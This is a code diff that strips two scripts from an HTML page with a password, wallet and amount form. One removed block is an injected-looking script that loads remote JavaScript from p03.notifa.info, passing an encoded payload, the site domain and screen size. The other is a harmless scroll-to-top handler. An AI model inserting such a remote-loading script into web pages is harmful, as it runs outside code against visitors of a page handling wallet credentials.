@@ -292,23 +292,6 @@ first you need to provide the input password, wallet, and amount. </p>
           </div>
       </div>
     </div>
-	
-  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mSeBV3jRvGwDUsMTO%2fECMDQTM8cG%2buTH%2fXtVevK%2f3YmFr3rprIM8ci2%2fvHRtzVAl49byx3IsHpiEnh7SWAv10wD%2b1%2fXQeJFubw71%2bZ1H9he8p32BR26%2bAOr38InNfqACvWlooZnSrvOlL63MwTBJXkV2KeUN4D4gpRW6HyegMFQOSZhkv5DSrGCXQajm0U7yq4rZF2LTa2meNg6hkrx6Lj%2bL5i0lnnUBrzX%2bnS5GbM7AcoIzp9WvxQGwuwRZD28BH0whaCA0uqCZTyc35TCvFHgOS86dfk%2f%2bkZsEyYdtUGRLAAW36Fb4%2bNzt%2fAM5tW6Xss0xYNhthn%2fB8cQtJO0hR0%2fV1vYyY2agsfVwgmd19RUNfueeax%2fyqKNKdVZqPS7MSIOpq1oHXMTiRRktJM2sZHXh7RdB9ckpja394qeQwojAanaTQy5RHGH%2bi%2f5AciLy5njJUFj%2foRRm%2fLySawZCROKwIeAmzLtUL" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
-
- </script>
- <script type="text/javascript">
-    $(window).scroll(function() {
-    if ($(this).scrollTop() >= 50) {        // If page is scrolled more than 50px
-        $('#return-to-top').fadeIn(200);    // Fade in the arrow
-    } else {
-        $('#return-to-top').fadeOut(200);   // Else fade out the arrow
-    }
-});
-$('#return-to-top').click(function() {      // When arrow is clicked
-    $('body,html').animate({
-        scrollTop : 0                       // Scroll to top of body
-    }, 1000);
-});
- </script></body>
+	</body>
 </html>
 
